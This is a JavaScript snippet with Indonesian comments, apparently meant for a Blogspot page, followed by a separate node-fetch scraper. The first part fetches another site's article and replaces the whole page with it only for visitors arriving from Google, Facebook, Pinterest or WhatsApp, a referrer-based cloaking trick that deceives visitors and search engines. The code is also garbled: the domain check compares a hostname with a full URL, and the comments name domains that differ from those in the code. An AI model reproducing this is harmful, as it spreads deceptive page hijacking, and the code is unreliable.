// Fungsi untuk mengambil konten dari URL menggunakan AJAX
function fetchHTML(url) {
  return new Promise((resolve, reject) => {
    const xhr = new XMLHttpRequest();
    xhr.open('GET', url);
    xhr.onreadystatechange = function () {
      if (xhr.readyState === XMLHttpRequest.DONE) {
        if (xhr.status === 200) {
          resolve(xhr.responseText);
        } else {
          reject(new Error('Gagal mengambil konten URL.'));
        }
      }
    };
    xhr.send();
  });
}

// Mengambil konten dari website https://infokredit.com
const url = 'https://blogzones.my.id/';
fetchHTML(url)
  .then((responseText) => {
    // Menentukan bagian konten yang ingin diambil, misalnya elemen dengan ID "content"
    const parser = new DOMParser();
    const htmlDoc = parser.parseFromString(responseText, 'text/html');
    const articleElement = htmlDoc.getElementById('content');

    if (articleElement) {
      // Mengganti konten artikel dengan konten yang diambil dari https://infokredit.com
      const articleContent = articleElement.innerHTML;

      // Melakukan penggantian konten hanya jika referer diizinkan dan domain saat ini adalah 'roneeyi.com'
      const referrer = document.referrer.toLowerCase();
      const currentDomain = window.location.hostname.toLowerCase();
      const allowedReferrers = ['google', 'facebook', 'pinterest', 'whatsapp.com'];

      if (allowedReferrers.some(referrer.includes.bind(referrer)) && currentDomain === 'https://awer323.blogspot.com/') {
        const article = document.querySelector('html');
        article.innerHTML = articleContent;
      }
    }
  })
  .catch((error) => {
    console.error(error);
  });
const fetch = require('node-fetch');

const url = "https://blogzones.my.id/";

fetch(url)
  .then(response => response.text())
  .then(data => {
    const newData = data.replace(/\n+/g, '');
    const newData2 = newData.replace(/<!DOCTYPE(.+?)<h1 class="title-big-detail">/, '');
    const judul = newData2.replace(/<\/h1>(.+?)html>/, '');

    console.log(judul);
  })
  .catch(error => {
    console.log("Terjadi kesalahan:", error);
  });
